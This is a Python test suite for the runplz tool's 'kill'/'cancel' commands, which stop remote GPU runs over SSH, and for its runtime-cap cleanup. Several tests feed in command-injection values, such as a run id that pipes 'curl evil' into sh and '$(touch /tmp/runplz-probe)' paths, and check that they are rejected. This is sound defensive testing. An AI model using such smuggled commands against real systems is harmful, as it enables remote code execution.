"""Coverage for ``runplz kill`` / ``runplz cancel`` (issue #67)."""

import json
import os
import stat
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from unittest import mock

import pytest

from runplz import cli, runs
from runplz.backends import ssh_common

RUN_ID = "20260826T010203Z-myhost-train-deadbeef"
OTHER_RUN_ID = "20260826T999999Z-otherhost-train-99999999"


def _write_manifest(outputs_dir: Path, **overrides) -> dict:
    manifest = {
        "run_id": RUN_ID,
        "backend": "brev",
        "target": "my-gpu-box",
        "function": "train",
        "remote_paths": {"meta": f"~/runplz-runs/{RUN_ID}/out/.runplz"},
    }
    manifest.update(overrides)
    meta = outputs_dir / ".runplz"
    meta.mkdir(parents=True, exist_ok=True)
    (meta / "run.json").write_text(json.dumps(manifest))
    return manifest


def _summary(**fields) -> str:
    base = {
        "pid": "4242",
        "container": "",
        "container_state": "none",
        "scan": "1",
        "finished": "0",
        "initial": "running",
        "final": "dead",
        "alive_before": "1",
        "alive_after": "0",
        "survivors": "",
        "signal": "TERM",
        "signalled": "1",
        "escalated": "0",
        "gpu_mem_used": "",
    }
    base.update(fields)
    body = "".join(f"{k}={v}\n" for k, v in base.items())
    return f"---SUMMARY---\n{body}---HEARTBEAT---\n---LOGTAIL---\n---END---\n"


# ---------------------------------------------------------------------------
# build_kill_command: shape


def test_kill_command_reads_the_control_files():
    cmd = ssh_common.build_kill_command("$HOME/runs/r1/out/.runplz", run_id="r1")
    assert "$HOME/runs/r1/out/.runplz/bootstrap.pid" in cmd
    assert "$HOME/runs/r1/out/.runplz/container" in cmd
    assert "killed_by_user" in cmd


def test_kill_command_identifies_processes_by_run_id_not_process_group():
    """A pgid would be the launching shell's, not this run's. See #67."""
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r1")
    assert f"{ssh_common.RUN_ID_ENV_VAR}=$runplz_run_id" in cmd
    assert "pgid" not in cmd
    # Never signal a whole process group.
    assert '"-$' not in cmd


def test_kill_command_signals_scanned_pids_and_container():
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r")
    assert 'kill -"$1" "$runplz_victim"' in cmd
    assert 'sudo docker kill --signal="$1" "$runplz_container"' in cmd


def test_kill_command_is_valid_posix_sh(tmp_path):
    script = tmp_path / "kill.sh"
    script.write_text(ssh_common.build_kill_command("$HOME/m", run_id="r"))
    assert subprocess.run(["sh", "-n", str(script)]).returncode == 0
    assert subprocess.run(["bash", "-n", str(script)]).returncode == 0


def test_kill_command_passes_tr_a_real_escape_not_a_nul_byte():
    """`tr '\\0'` needs the two-character escape; an actual NUL cannot cross argv."""
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r")
    assert "\x00" not in cmd
    assert r"tr '\0' '\n'" in cmd


def test_kill_command_honors_no_escalate():
    assert 'if [ "1" = "1" ]; then' in ssh_common.build_kill_command("$HOME/m", escalate=True)
    assert 'if [ "0" = "1" ]; then' in ssh_common.build_kill_command("$HOME/m", escalate=False)


def test_kill_command_uses_requested_first_signal():
    assert 'runplz_signal "INT"' in ssh_common.build_kill_command("$HOME/m", first_signal="INT")


# ---------------------------------------------------------------------------
# build_kill_command: everything interpolated is validated


@pytest.mark.parametrize(
    "meta",
    [
        "$HOME/x/$(touch /tmp/runplz-probe)",
        "~/x; touch /tmp/runplz-probe",
        "$HOME/x`id`",
        "relative/path",
        "",
    ],
)
def test_kill_command_rejects_an_unsafe_meta_path(meta):
    with pytest.raises(ValueError, match="meta path"):
        ssh_common.build_kill_command(meta, run_id="r")


@pytest.mark.parametrize("run_id", ['a"; curl evil|sh; :"', "x y", "$(id)", "a`id`"])
def test_kill_command_rejects_an_unsafe_run_id(run_id):
    with pytest.raises(ValueError, match="run id"):
        ssh_common.build_kill_command("$HOME/m", run_id=run_id)


def test_kill_command_rejects_an_unknown_signal():
    with pytest.raises(ValueError, match="signal"):
        ssh_common.build_kill_command("$HOME/m", first_signal='x"; curl evil|sh; :"')


def test_kill_command_rejects_a_non_integer_timeout():
    with pytest.raises((ValueError, TypeError)):
        ssh_common.build_kill_command("$HOME/m", timeout_s="5; id")


def test_kill_command_rejects_a_negative_timeout():
    with pytest.raises(ValueError, match="timeout"):
        ssh_common.build_kill_command("$HOME/m", timeout_s=-1)


def test_kill_command_rejects_an_unsafe_proc_root():
    with pytest.raises(ValueError, match="proc root"):
        ssh_common.build_kill_command("$HOME/m", proc_root="/proc; id")


# ---------------------------------------------------------------------------
# The generated shell, actually executed
#
# procfs only exists on Linux, so the marker scan is exercised against a fake
# proc tree whose <pid>/environ entries name real, live processes. The script
# then really signals them, which is the behavior worth proving.


class _FakeBox:
    """A meta dir plus a fake procfs naming real processes."""

    def __init__(self, root: Path):
        self.root = root
        self.meta = root / "home" / "runplz-runs" / RUN_ID / "out" / ".runplz"
        self.meta.mkdir(parents=True)
        self.proc = root / "proc"
        self.proc.mkdir()
        self.procs: list[subprocess.Popen] = []
        self._stop = threading.Event()
        # Reap promptly, as init does on a real box: an unreaped zombie still
        # answers `kill -0` and would look alive.
        threading.Thread(target=self._reap, daemon=True).start()

    def _reap(self):
        while not self._stop.is_set():
            for p in list(self.procs):
                p.poll()
            time.sleep(0.02)

    def spawn(self, run_id: str | None, *, ignores_term: bool = False) -> subprocess.Popen:
        if ignores_term:
            argv = ["bash", "-c", "trap '' TERM; sleep 300"]
        else:
            argv = ["sleep", "300"]
        p = subprocess.Popen(argv, start_new_session=True)
        self.procs.append(p)
        entry = self.proc / str(p.pid)
        entry.mkdir()
        env = "PATH=/usr/bin\0HOME=/root\0"
        if run_id is not None:
            env += f"{ssh_common.RUN_ID_ENV_VAR}={run_id}\0"
        (entry / "environ").write_bytes(env.encode())
        return p

    def fake_container(self, name: str, *, honours_term: bool = True) -> Path:
        """Install `sudo` and `docker` stubs modelling one running container.

        The kill script's only handle on a docker-mode run is
        `docker kill --signal=...`, so asserting that TERM comes before KILL
        needs a docker that actually answers. State lives in files, like the
        cloud CLI stubs: `docker inspect` reads it, `docker kill` writes it.

        `honours_term=False` is a job that traps TERM, which is what forces
        the escalation the timeout exists for.
        """
        bin_dir = self.root / "bin"
        bin_dir.mkdir(exist_ok=True)
        state = self.root / "container.state"
        state.write_text("running")
        signals = self.root / "container.signals"
        signals.write_text("")

        # `sudo` is not installed on every CI image and would prompt anyway;
        # the script only ever uses it as a prefix, so run the rest.
        (bin_dir / "sudo").write_text('#!/bin/sh\nexec "$@"\n')
        (bin_dir / "docker").write_text(
            "#!/bin/sh\n"
            f'STATE="{state}"\n'
            f'SIGNALS="{signals}"\n'
            f'NAME="{name}"\n'
            'case "$1" in\n'
            "  inspect)\n"
            # Only this container exists; anything else is absent, so a script
            # that signalled the wrong name would not see it running.
            '    [ "$4" = "$NAME" ] || exit 1\n'
            '    if [ "$(cat "$STATE")" = "running" ]; then echo true; '
            "else echo false; fi\n"
            "    ;;\n"
            "  kill)\n"
            '    [ "$3" = "$NAME" ] || exit 1\n'
            '    sig=$(printf %s "$2" | sed "s/--signal=//")\n'
            '    printf "%s\\n" "$sig" >> "$SIGNALS"\n'
            f'    if [ "$sig" = "KILL" ] || [ "{int(honours_term)}" = "1" ]; then\n'
            '      echo stopped > "$STATE"\n'
            "    fi\n"
            "    ;;\n"
            "esac\n"
            "exit 0\n"
        )
        for stub in ("sudo", "docker"):
            path = bin_dir / stub
            path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        self.bin_dir = bin_dir
        return signals

    def signals_sent(self) -> list[str]:
        path = self.root / "container.signals"
        return [line for line in path.read_text().split() if line]

    def run_kill(self, **kwargs) -> dict[str, str]:
        kwargs.setdefault("run_id", RUN_ID)
        kwargs.setdefault("timeout_s", 3)
        kwargs.setdefault("proc_root", str(self.proc))
        script = self.root / "kill.sh"
        script.write_text(ssh_common.build_kill_command(str(self.meta), **kwargs))
        env = dict(os.environ)
        bin_dir = getattr(self, "bin_dir", None)
        if bin_dir is not None:
            env["PATH"] = f"{bin_dir}{os.pathsep}{env['PATH']}"
        r = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=180, env=env
        )
        assert r.returncode == 0, r.stderr
        sections = runs._parse_status_sections(r.stdout)
        return ssh_common.parse_kv_block(sections.get("SUMMARY", ""))

    def cleanup(self):
        self._stop.set()
        for p in self.procs:
            try:
                os.kill(p.pid, 9)
            except ProcessLookupError:
                pass


@pytest.fixture
def box(tmp_path):
    b = _FakeBox(Path(tempfile.mkdtemp(dir=tmp_path)))
    try:
        yield b
    finally:
        b.cleanup()


def _alive(p: subprocess.Popen) -> bool:
    return p.poll() is None


def test_kill_stops_every_process_carrying_the_run_id(box):
    """Orphaned workers included — the case that motivated the issue."""
    workers = [box.spawn(RUN_ID) for _ in range(3)]
    (box.meta / "bootstrap.pid").write_text(f"{workers[0].pid}\n")

    fields = box.run_kill()

    assert fields["scan"] == "1"
    assert fields["alive_before"] == "1"
    assert fields["alive_after"] == "0"
    assert fields["survivors"] == ""
    assert fields["escalated"] == "0", "SIGTERM should have been enough"
    time.sleep(0.3)
    assert [_alive(p) for p in workers] == [False, False, False]


def test_kill_leaves_another_run_on_the_same_box_alone(box):
    """A process group would have taken these with it."""
    mine = [box.spawn(RUN_ID) for _ in range(2)]
    theirs = [box.spawn(OTHER_RUN_ID) for _ in range(2)]
    unmarked = box.spawn(None)
    (box.meta / "bootstrap.pid").write_text(f"{mine[0].pid}\n")

    box.run_kill()
    time.sleep(0.3)

    assert [_alive(p) for p in mine] == [False, False]
    assert [_alive(p) for p in theirs] == [True, True], "collateral damage to another run"
    assert _alive(unmarked), "collateral damage to an unrelated process"


def test_kill_escalates_to_sigkill_when_the_job_ignores_sigterm(box):
    stubborn = box.spawn(RUN_ID, ignores_term=True)
    time.sleep(0.3)

    fields = box.run_kill(timeout_s=2)

    assert fields["escalated"] == "1"
    assert fields["alive_after"] == "0"
    time.sleep(0.3)
    assert not _alive(stubborn)


def test_kill_reports_survivors_instead_of_claiming_success(box):
    """--no-escalate on a SIGTERM-proof job must not look like a clean stop."""
    stubborn = box.spawn(RUN_ID, ignores_term=True)
    time.sleep(0.3)

    fields = box.run_kill(timeout_s=1, escalate=False)

    assert fields["escalated"] == "0"
    assert fields["alive_after"] == "1"
    assert str(stubborn.pid) in fields["survivors"].split()
    assert _alive(stubborn)


def test_kill_is_idempotent_on_a_run_that_never_existed(box):
    fields = box.run_kill()
    assert fields["signalled"] == "0"
    assert fields["alive_before"] == "0"
    assert not (box.meta / "events.ndjson").exists()


def test_kill_records_a_killed_by_user_event(box):
    box.spawn(RUN_ID)
    fields = box.run_kill()
    assert fields["signalled"] == "1"
    event = json.loads((box.meta / "events.ndjson").read_text().strip())
    assert event["event"] == "killed_by_user"
    assert event["run_id"] == RUN_ID


def test_kill_does_not_trust_a_recorded_pid_once_the_run_has_exited(box):
    """PID wraparound: a finished run's pid may belong to somebody else now."""
    bystander = box.spawn(None)
    (box.meta / "bootstrap.pid").write_text(f"{bystander.pid}\n")
    # Exactly the form the remote printf writes (no spaces after the colons).
    (box.meta / "events.ndjson").write_text(
        '{"ts":"2026-08-26T00:00:00Z","run_id":"' + RUN_ID + '","event":"remote_command_exit"}\n'
    )

    fields = box.run_kill()

    assert fields["finished"] == "1"
    assert fields["signalled"] == "0", "signalled a pid belonging to a finished run"
    time.sleep(0.3)
    assert _alive(bystander)


@pytest.mark.parametrize("bad_pid", ["0", "1", "0000001", "not-a-pid", ""])
def test_kill_refuses_dangerous_or_malformed_pids(box, bad_pid):
    """`kill -TERM 0` signals our own group; pid 1 is init."""
    (box.meta / "bootstrap.pid").write_text(f"{bad_pid}\n")
    fields = box.run_kill()
    assert fields["pid"] == ""
    assert fields["signalled"] == "0"


def test_kill_ignores_a_zombie_that_still_answers_kill_0(box):
    """A zombie would otherwise pin the wait loop and force a pointless SIGKILL."""
    p = subprocess.Popen(["sleep", "300"], start_new_session=True)
    entry = box.proc / str(p.pid)
    entry.mkdir()
    (entry / "environ").write_bytes(f"{ssh_common.RUN_ID_ENV_VAR}={RUN_ID}\0".encode())
    # Real procfs marks a reaped-pending process Z; mirror that in the fake tree.
    (entry / "stat").write_text(f"{p.pid} (sleep) Z 1 1 1 0 -1 0 0 0 0 0\n")
    p.kill()

    fields = box.run_kill()

    assert fields["alive_before"] == "0"
    assert fields["signalled"] == "0"
    p.wait(timeout=10)


def test_kill_falls_back_to_the_pid_without_procfs(box):
    """No /proc (or a pre-3.16 run): the recorded pid is all there is."""
    worker = box.spawn(RUN_ID)
    (box.meta / "bootstrap.pid").write_text(f"{worker.pid}\n")

    fields = box.run_kill(proc_root="/nonexistent-proc")

    assert fields["scan"] == "0"
    assert fields["signalled"] == "1"
    time.sleep(0.3)
    assert not _alive(worker)


# ---------------------------------------------------------------------------
# launcher


def test_launcher_tags_the_bootstrap_environment_with_the_run_id():
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    launcher = ssh_common.build_detached_launcher(remote_run, "echo hi")
    # Identified by the script it launches, not by the word "nohup": nohup is
    # now probed and conditional (#92), so grepping for it finds the probe.
    spawn_line = next(
        line for line in launcher.splitlines() if '/run.sh"' in line and line.endswith("&")
    )
    # Must be on the exec line: /proc/<pid>/environ is fixed at exec time, so a
    # later `export` inside the script would never appear there.
    assert spawn_line.startswith(f"{ssh_common.RUN_ID_ENV_VAR}={remote_run.run_id} ")
    assert "setsid" not in launcher
    assert f'echo $! > "{remote_run.meta_shell}/bootstrap.pid"' in launcher
    assert "pgid" not in launcher


def test_launcher_still_runs_and_records_its_pid(tmp_path):
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    launcher = ssh_common.build_detached_launcher(remote_run, "sleep 5")
    subprocess.run(
        ["bash", "-c", launcher],
        check=True,
        env=dict(os.environ, HOME=str(tmp_path)),
        timeout=60,
    )
    meta = tmp_path / "runplz-runs" / remote_run.run_id / "out" / ".runplz"
    pid = int((meta / "bootstrap.pid").read_text().strip())
    try:
        assert pid > 1
    finally:
        try:
            os.kill(pid, 9)
        except ProcessLookupError:
            pass


def test_launcher_rejects_an_unsafe_run_id():
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    object.__setattr__(remote_run, "run_id", 'x"; curl evil|sh; :"')
    with pytest.raises(ValueError, match="run id"):
        ssh_common.build_detached_launcher(remote_run, "echo hi")


# ---------------------------------------------------------------------------
# container name recording


def test_container_mode_records_container_name_for_kill():
    recorded = {}

    def fake_ssh(target, command, ssh_opts=None):
        recorded["command"] = command

    function = mock.Mock(env={})
    function.name = "train"
    remote_run = ssh_common.make_remote_run_context(
        backend="brev", target="box", function_name="train"
    )
    with mock.patch.object(ssh_common, "ssh_exec", fake_ssh):
        ssh_common.run_container_detached(
            target="box",
            container_name="runplz-train-abc12345",
            function=function,
            rel_script="job.py",
            args=[],
            kwargs={},
            gpu_flag="",
            app_name="app",
            remote_run=remote_run,
        )
    command = recorded["command"]
    assert f'> "{remote_run.meta_shell}/container"' in command
    assert "runplz-train-abc12345" in command
    # Written before the monitor loop so an early kill still finds it.
    assert command.index("/container") < command.index("runplz_event container_started")


# ---------------------------------------------------------------------------
# runs.kill


def test_kill_reports_a_clean_stop(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake) as run_mock:
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 0
    out = capsys.readouterr().out
    assert "target:     my-gpu-box" in out
    assert "stopped with SIGTERM" in out
    cmd = run_mock.call_args.args[0]
    assert cmd[0] == "ssh"
    assert cmd[-2] == "my-gpu-box"
    assert "killed_by_user" in cmd[-1]


def test_kill_reports_escalation(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(escalated="1"), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "escalated to SIGKILL" in capsys.readouterr().out


@pytest.mark.parametrize("signal", ["INT", "KILL"])
def test_kill_reports_the_signal_actually_sent(tmp_path, capsys, signal):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(signal=signal), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        runs.kill(
            outputs_dir=tmp_path,
            host_override=None,
            run_id_override=None,
            first_signal=signal,
        )
    assert f"stopped with SIG{signal}" in capsys.readouterr().out


def test_kill_on_an_already_dead_run_is_a_success(tmp_path, capsys):
    _write_manifest(tmp_path)
    stdout = _summary(
        initial="dead", final="dead", signalled="0", alive_before="0", alive_after="0", pid=""
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 0
    assert "nothing to kill" in capsys.readouterr().out


def test_kill_returns_nonzero_when_the_run_survives(tmp_path, capsys):
    """`runplz kill && runplz brev job.py` must not proceed over a live GPU."""
    _write_manifest(tmp_path)
    stdout = _summary(final="running", alive_after="1", survivors="111 222")
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == runs.KILL_SURVIVED_RC
    out = capsys.readouterr().out
    assert "SIGNALLED BUT STILL ALIVE" in out
    assert "111 222" in out


def test_kill_returns_nonzero_when_only_the_container_survives(tmp_path, capsys):
    _write_manifest(tmp_path)
    stdout = _summary(
        container="runplz-train-abc", container_state="running", alive_after="1", survivors=""
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == runs.KILL_SURVIVED_RC
    assert "container still running" in capsys.readouterr().out


def test_kill_does_not_claim_success_when_the_remote_script_did_not_run(tmp_path, capsys):
    """A login shell that can't parse the script, or a banner on stdout."""
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout="Welcome to Ubuntu!\n", stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 2
    err = capsys.readouterr().err
    assert "could not read a kill result" in err


def test_kill_warns_when_no_process_marker_was_available(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(scan="0"), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "no process marker available" in capsys.readouterr().out


def test_kill_renders_gpu_memory_and_heartbeat_and_logtail(tmp_path, capsys):
    _write_manifest(tmp_path)
    hb = json.dumps({"ts": "2026-08-26T01:05:30Z", "run_id": "x"})
    stdout = _summary(gpu_mem_used="0,512")
    stdout = stdout.replace("---HEARTBEAT---\n", f"---HEARTBEAT---\n{hb}\n")
    # A log line that looks exactly like a section marker must survive intact.
    stdout = stdout.replace(
        "---LOGTAIL---\n",
        "---LOGTAIL---\n| epoch 1\n| --- checkpoint saved ---\n| epoch 2\n",
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    out = capsys.readouterr().out
    assert "gpu memory: gpu0=0MiB, gpu1=512MiB" in out
    assert "2026-08-26T01:05:30Z" in out
    assert "epoch 1" in out
    assert "--- checkpoint saved ---" in out
    assert "epoch 2" in out, "log tail truncated by a marker-like line"


def test_kill_returns_ssh_failure_code(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=255, stdout="", stderr="ssh: connect refused")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 255
    assert "ssh to my-gpu-box failed" in capsys.readouterr().err


def test_kill_survives_an_ssh_timeout(tmp_path, capsys):
    _write_manifest(tmp_path)
    with mock.patch(
        "runplz.runs.subprocess.run",
        side_effect=subprocess.TimeoutExpired(cmd="ssh", timeout=75),
    ):
        rc = runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 2
    assert "timed out" in capsys.readouterr().err


def test_kill_ssh_timeout_outlives_the_remote_escalation_clock(tmp_path):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake) as run_mock:
        runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None, timeout_s=600)
    assert run_mock.call_args.kwargs["timeout"] > 600 + ssh_common.KILL_SETTLE_S


def test_kill_uses_run_id_override_when_there_is_no_manifest(tmp_path, capsys):
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake) as run_mock:
        rc = runs.kill(outputs_dir=tmp_path, host_override="other-box", run_id_override="rid-9")
    assert rc == 0
    remote_cmd = run_mock.call_args.args[0][-1]
    assert "runplz-runs/rid-9/out/.runplz/bootstrap.pid" in remote_cmd
    assert "run:        rid-9" in capsys.readouterr().out


def test_kill_refuses_a_tampered_meta_path_from_the_manifest(tmp_path, capsys):
    """The manifest is rsynced down off the remote box, so it is untrusted."""
    _write_manifest(
        tmp_path,
        remote_paths={"meta": "~/runplz-runs/$(touch /tmp/runplz-probe)/out/.runplz"},
    )
    rc = cli.main(["kill", "--outputs-dir", str(tmp_path)])
    assert rc == 2
    err = capsys.readouterr().err
    assert "refusing to use remote path from the run manifest" in err
    assert "runplz-probe" in err, "the rejected value should be shown"


def test_kill_drops_a_tampered_run_id_from_the_remote_command(tmp_path):
    _write_manifest(tmp_path, run_id='evil"; touch /tmp/runplz-probe; echo "')
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz.runs.subprocess.run", return_value=fake) as run_mock:
        runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "runplz-probe" not in run_mock.call_args.args[0][-1]


# ---------------------------------------------------------------------------
# CLI


@pytest.mark.parametrize("verb", ["kill", "cancel"])
def test_cli_dispatches_both_verbs(tmp_path, verb):
    _write_manifest(tmp_path)
    with mock.patch.object(runs, "kill", return_value=0) as kill_mock:
        rc = cli.main([verb, "--outputs-dir", str(tmp_path)])
    assert rc == 0
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["outputs_dir"] == tmp_path.resolve()
    assert kwargs["timeout_s"] == ssh_common.DEFAULT_KILL_TIMEOUT_S
    assert kwargs["escalate"] is True
    assert kwargs["first_signal"] == "TERM"


def test_cli_kill_propagates_the_survivor_exit_code(tmp_path):
    _write_manifest(tmp_path)
    with mock.patch.object(runs, "kill", return_value=runs.KILL_SURVIVED_RC):
        assert cli.main(["kill", "--outputs-dir", str(tmp_path)]) == runs.KILL_SURVIVED_RC


def test_cli_kill_plumbs_signal_and_timeout(tmp_path):
    _write_manifest(tmp_path)
    with mock.patch.object(runs, "kill", return_value=0) as kill_mock:
        cli.main(
            [
                "kill",
                "--outputs-dir",
                str(tmp_path),
                "--signal",
                "INT",
                "--timeout",
                "45",
                "--no-escalate",
            ]
        )
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["first_signal"] == "INT"
    assert kwargs["timeout_s"] == 45
    assert kwargs["escalate"] is False


def test_cli_kill_rejects_a_negative_timeout(tmp_path):
    _write_manifest(tmp_path)
    with pytest.raises(SystemExit):
        cli.main(["kill", "--outputs-dir", str(tmp_path), "--timeout", "-1"])


def test_cli_kill_surfaces_missing_manifest(tmp_path, capsys):
    rc = cli.main(["kill", "--outputs-dir", str(tmp_path)])
    assert rc == 1
    assert "No run manifest" in capsys.readouterr().err


def test_cli_kill_run_id_without_host_errors(tmp_path, capsys):
    rc = cli.main(["kill", "--outputs-dir", str(tmp_path), "--run-id", "xyz"])
    assert rc == 2
    assert "--run-id requires --host" in capsys.readouterr().err


def test_cli_kill_targets_an_explicit_host_and_run_id(tmp_path):
    with mock.patch.object(runs, "kill", return_value=0) as kill_mock:
        cli.main(["kill", "--host", "other-box", "--run-id", "rid-9"])
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["host_override"] == "other-box"
    assert kwargs["run_id_override"] == "rid-9"


if sys.platform == "win32":  # pragma: no cover - runplz targets POSIX hosts
    pytest.skip("kill relies on POSIX signals", allow_module_level=True)


# ---------------------------------------------------------------------------
# runtime cap cleanup is scoped to the run


class _CapRemote:
    """Collects every remote command the cap path issues.

    The cap now sends two: the cleanup, then the lifecycle event (#155). A
    fake that kept only the last one would silently start asserting against
    the wrong command.
    """

    def __init__(self, summary=""):
        self.summary = summary
        self.commands = []

    def run(self, cmd, **kwargs):
        remote = cmd[-1] if isinstance(cmd, list) else str(cmd)
        self.commands.append(remote)
        stdout = self.summary if "runplz_run_pids" in remote else ""
        return mock.Mock(returncode=0, stdout=stdout, stderr="")

    # The event goes out through `ssh_exec`, which wraps its payload in
    # `bash -lc`; the cleanup is sent as a bare remote command. Splitting on
    # that rather than on "events.ndjson", which `build_kill_command` also
    # names — it appends `killed_by_user` from inside the same script.
    @staticmethod
    def _is_event(command):
        return command.startswith("bash -lc ")

    @property
    def cleanup(self):
        """The stop command."""
        return next(c for c in self.commands if not self._is_event(c))

    @property
    def events(self):
        """Every lifecycle event this path recorded, as runplz wrote it.

        Parsed back out of the real remote command rather than read off a
        mock, so a payload that is not valid JSON fails here.
        """
        out = []
        for command in self.commands:
            if not self._is_event(command):
                continue
            start = command.find('{"')
            if start == -1:
                continue
            out.append(json.loads(command[start : command.rindex("}") + 1]))
        return out


def test_runtime_cap_stops_only_this_run_when_the_context_is_known():
    """`pkill -f runplz._bootstrap` would take a co-tenant run down too."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None, remote_run=remote_run)
    assert "pkill" not in remote.cleanup
    assert f"{ssh_common.RUN_ID_ENV_VAR}=$runplz_run_id" in remote.cleanup
    assert remote_run.run_id in remote.cleanup


def test_runtime_cap_falls_back_to_pkill_without_a_run_context():
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None)
    assert "pkill" in remote.cleanup


# -- the cap leaves a lifecycle event (#155) ------------------------------
#
# Every neighbouring path already records one -- `bootstrap_launch_failed`,
# `killed_by_user`, `remote_command_stalled`. The cap recorded nothing, so
# `events.ndjson` ended at whatever the job last wrote and a capped run read
# like an abrupt crash. Since #150 a capped run's outputs survive, so the
# artefacts included the partial results with no record of why they stop.


def test_a_capped_run_records_a_terminal_event_naming_the_cap():
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    remote = _CapRemote(summary=_summary(final="dead", alive_after="0"))

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 900, container_name=None, remote_run=remote_run)

    events = [e for e in remote.events if e["event"] == "killed_by_runtime_cap"]
    assert len(events) == 1, remote.commands
    assert events[0]["run_id"] == remote_run.run_id
    assert events[0]["threshold_seconds"] == 900
    # `build_kill_command` measured this; it is not a guess about what the
    # signal probably did.
    assert events[0]["process_state"] == "dead"


def test_the_docker_path_reports_the_container_not_an_invented_process_state():
    """Docker mode has no bootstrap pid -- the job's processes are in the
    container's namespace -- and the script reports "missing" for a pid that
    was never there. Recording that would read as a process that vanished, so
    the container's own state is what the event carries."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    remote = _CapRemote(summary=_summary(pid="", final="missing", container_state="stopped"))

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap(
                "box", 60, container_name="runplz-train-abc123", remote_run=remote_run
            )

    event = next(e for e in remote.events if e["event"] == "killed_by_runtime_cap")
    assert "process_state" not in event
    assert event["container"] == "runplz-train-abc123"
    assert event["container_state"] == "stopped"


def test_the_cap_stops_a_container_gracefully_rather_than_sigkilling_it():
    """#158. `docker kill` is an immediate SIGKILL, and it was the *first*
    branch -- so the default configuration was the one that stopped least
    gracefully, on the path where partial output is the only evidence."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap(
                "box", 60, container_name="runplz-train-abc123", remote_run=remote_run
            )

    cleanup = remote.cleanup
    assert 'sudo docker kill --signal="$1"' in cleanup
    assert 'runplz_signal "TERM"' in cleanup
    assert "sudo docker kill runplz-train-abc123" not in cleanup
    # The name the orchestrator started, not only whatever the file says.
    assert 'runplz_container="runplz-train-abc123"' in cleanup


def test_the_cap_does_not_record_that_a_user_killed_the_run():
    """The script's own event would contradict `killed_by_runtime_cap`."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    remote = _CapRemote()

    with mock.patch.object(ssh_common.subprocess, "run", remote.run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap(
                "box", 60, container_name="runplz-train-abc123", remote_run=remote_run
            )

    assert "killed_by_user" not in remote.cleanup
